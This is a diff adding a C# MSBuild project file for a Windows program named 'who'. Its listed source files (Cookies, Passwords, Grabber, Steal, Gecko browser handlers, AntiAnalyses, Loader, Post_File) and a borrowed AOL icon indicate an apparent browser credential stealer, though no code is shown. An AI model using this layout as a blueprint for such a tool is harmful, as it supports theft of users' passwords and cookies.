@@ -1,0 +1,132 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{F085D2E4-8341-474B-AE7C-38932E757BEC}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <RootNamespace>who</RootNamespace>
+    <AssemblyName>who</AssemblyName>
+    <TargetFrameworkVersion>v4.5</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <Deterministic>true</Deterministic>
+    <TargetFrameworkProfile />
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <Prefer32Bit>false</Prefer32Bit>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <Prefer32Bit>false</Prefer32Bit>
+  </PropertyGroup>
+  <PropertyGroup>
+    <StartupObject>
+    </StartupObject>
+  </PropertyGroup>
+  <PropertyGroup>
+    <ApplicationIcon>aol_social_media_icon_127342.ico</ApplicationIcon>
+  </PropertyGroup>
+  <PropertyGroup />
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)' == 'Debug|x86'">
+    <DebugSymbols>true</DebugSymbols>
+    <OutputPath>bin\x86\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <DebugType>full</DebugType>
+    <PlatformTarget>x86</PlatformTarget>
+    <LangVersion>7.3</LangVersion>
+    <ErrorReport>prompt</ErrorReport>
+    <CodeAnalysisRuleSet>MinimumRecommendedRules.ruleset</CodeAnalysisRuleSet>
+    <Prefer32Bit>true</Prefer32Bit>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)' == 'Release|x86'">
+    <OutputPath>bin\x86\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <Optimize>true</Optimize>
+    <DebugType>pdbonly</DebugType>
+    <PlatformTarget>x86</PlatformTarget>
+    <LangVersion>7.3</LangVersion>
+    <ErrorReport>prompt</ErrorReport>
+    <CodeAnalysisRuleSet>MinimumRecommendedRules.ruleset</CodeAnalysisRuleSet>
+    <Prefer32Bit>true</Prefer32Bit>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="Microsoft.VisualBasic" />
+    <Reference Include="System" />
+    <Reference Include="System.Core" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.IO.Compression.FileSystem" />
+    <Reference Include="System.Management" />
+    <Reference Include="System.Security" />
+    <Reference Include="System.Windows" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Xml.Linq" />
+    <Reference Include="System.Data.DataSetExtensions" />
+    <Reference Include="Microsoft.CSharp" />
+    <Reference Include="System.Data" />
+    <Reference Include="System.Net.Http" />
+    <Reference Include="System.Xml" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="APIs\Post_File.cs" />
+    <Compile Include="APIs\SqlHandler.cs" />
+    <Compile Include="Func\Cookies.cs" />
+    <Compile Include="Func\Grabber.cs" />
+    <Compile Include="Func\History.cs" />
+    <Compile Include="Func\Loader.cs" />
+    <Compile Include="Func\Passwords.cs" />
+    <Compile Include="Func\User.cs" />
+    <Compile Include="Func\WebData.cs" />
+    <Compile Include="GeckoBrowsers\CNT.cs" />
+    <Compile Include="GeckoBrowsers\FF.cs" />
+    <Compile Include="GeckoBrowsers\Gecko\Gecko1.cs" />
+    <Compile Include="GeckoBrowsers\Gecko\Gecko2.cs" />
+    <Compile Include="GeckoBrowsers\Gecko\Gecko3.cs" />
+    <Compile Include="GeckoBrowsers\Gecko\Gecko4.cs" />
+    <Compile Include="GeckoBrowsers\Gecko\Gecko5.cs" />
+    <Compile Include="GeckoBrowsers\Gecko\Gecko6.cs" />
+    <Compile Include="GeckoBrowsers\Gecko\Gecko7.cs" />
+    <Compile Include="GeckoBrowsers\Gecko\Gecko8.cs" />
+    <Compile Include="GeckoBrowsers\Gecko\Gecko9.cs" />
+    <Compile Include="GeckoBrowsers\IsNullExtension.cs" />
+    <Compile Include="GeckoBrowsers\NoiseMe.Drags.App.Models.JSON\JavaScriptReader.cs" />
+    <Compile Include="GeckoBrowsers\NoiseMe.Drags.App.Models.JSON\JsonArray.cs" />
+    <Compile Include="GeckoBrowsers\NoiseMe.Drags.App.Models.JSON\JsonExt.cs" />
+    <Compile Include="GeckoBrowsers\NoiseMe.Drags.App.Models.JSON\JsonObject.cs" />
+    <Compile Include="GeckoBrowsers\NoiseMe.Drags.App.Models.JSON\JsonPrimitive.cs" />
+    <Compile Include="GeckoBrowsers\NoiseMe.Drags.App.Models.JSON\JsonType.cs" />
+    <Compile Include="GeckoBrowsers\NoiseMe.Drags.App.Models.JSON\JsonValue.cs" />
+    <Compile Include="GeckoBrowsers\ROW.cs" />
+    <Compile Include="GeckoBrowsers\Steal.cs" />
+    <Compile Include="GeckoBrowsers\StringExtension.cs" />
+    <Compile Include="GeckoBrowsers\SZ.cs" />
+    <Compile Include="Helper\AntiAnalyses.cs" />
+    <Compile Include="Helper\Dirs.cs" />
+    <Compile Include="Helper\Encrypt.cs" />
+    <Compile Include="Helper\Helpers.cs" />
+    <Compile Include="Program.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="App.config" />
+  </ItemGroup>
+  <ItemGroup />
+  <ItemGroup>
+    <Content Include="aol_social_media_icon_127342.ico" />
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+</Project>
